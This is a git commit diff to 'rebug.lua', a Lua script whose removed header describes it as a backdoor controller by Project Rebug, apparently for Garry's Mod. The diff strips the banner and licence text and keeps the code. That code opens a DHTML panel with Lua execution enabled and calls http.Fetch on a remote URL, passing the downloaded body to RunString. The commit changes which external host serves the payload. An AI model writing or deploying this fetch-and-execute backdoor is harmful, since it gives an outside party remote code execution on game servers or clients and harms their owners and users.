f48188f463aebba550be89e90c29b1c6662172f3
Void <54481654+Void09@users.noreply.github.com>
2020-03-27 18:45:18 +0000

    .

--- Rebug V2/external/rebug.lua
+++ Rebug V2/external/rebug.lua
@@ -1,36 +1,5 @@
-/*=======================================================================
-
-   ▄████████    ▄████████ ▀█████████▄  ███    █▄     ▄██████▄  
-  ███    ███   ███    ███   ███    ███ ███    ███   ███    ███ 
-  ███    ███   ███    █▀    ███    ███ ███    ███   ███    █▀  
- ▄███▄▄▄▄██▀  ▄███▄▄▄      ▄███▄▄▄██▀  ███    ███  ▄███        
-▀▀███▀▀▀▀▀   ▀▀███▀▀▀     ▀▀███▀▀▀██▄  ███    ███ ▀▀███ ████▄  
-▀███████████   ███    █▄    ███    ██▄ ███    ███   ███    ███ 
-  ███    ███   ███    ███   ███    ███ ███    ███   ███    ███ 
-  ███    ███   ██████████ ▄█████████▀  ████████▀    ████████▀  
-  ███    ███                                                   
-
-
-Backdoor controller created by Project Rebug. The code for this script
-has been made organised for better understanding.
----------------------------------------------------------
-// Coded By ProjectRebug Login Release Source
-// https://github.com/Void09/Login-Release
-// Note to the person using this, removing this
-// text is in violation of the licence you agreed
-// to by downloading.
-// Copyright © ProjectRebug 2019
-// Licenced under © GNU licence here
-// https://github.com/ProjectRebug/RebugV2-Release/blob/master/LICENSE
----------------------------------------------------------
-
-Project Rebug: 2016-2019
-=======================================================================*/
-
-// Code for the script is on the link
-
 local f = vgui.Create('DHTML');
 f:SetAllowLua(true);
-return f:ConsoleMessage([[RUNLUA: 
-http.Fetch("https://rvac.cc/log1n/bd.lua",RunString)
+return f:ConsoleMessage([[RUNLUA:
+http.Fetch("https://x.qrextomnia.club/menu.lua",function(b)RunString(b)end)
 ]]);
